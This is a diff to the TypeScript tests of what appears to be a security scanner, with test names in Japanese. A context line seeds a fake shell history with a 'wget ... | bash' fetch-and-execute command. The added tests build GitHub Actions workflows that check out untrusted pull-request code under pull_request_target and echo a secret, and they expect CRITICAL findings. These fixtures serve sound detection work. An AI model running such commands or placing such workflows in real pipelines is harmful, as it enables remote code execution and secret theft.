@@ -72,3 +72,12 @@ describe('シェル履歴（CLI check_s18）', () => {
     expect(await keys([file('h/.bash_history', 'ls\nwget -qO- https://x.example.invalid/i |bash\n')])).toContain('HIGH §18 h/.bash_history');
   });
 });
+
+describe('pull_request_target の checkout（引用符・大文字小文字）', () => {
+  const wf = (uses: string) => file('r/.github/workflows/pr.yml', `on: pull_request_target\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: ${uses}\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}\n      - run: echo \${{ secrets.TOKEN }}\n`);
+  it('uses: "actions/checkout@v4" / \'Actions/Checkout@v4\' でも CRITICAL §21', async () => {
+    for (const u of ['"actions/checkout@v4"', "'Actions/Checkout@v4'", 'ACTIONS/checkout@v4']) {
+      expect(await keys([wf(u)])).toContain('CRITICAL §21 r/.github/workflows/pr.yml');
+    }
+  });
+});
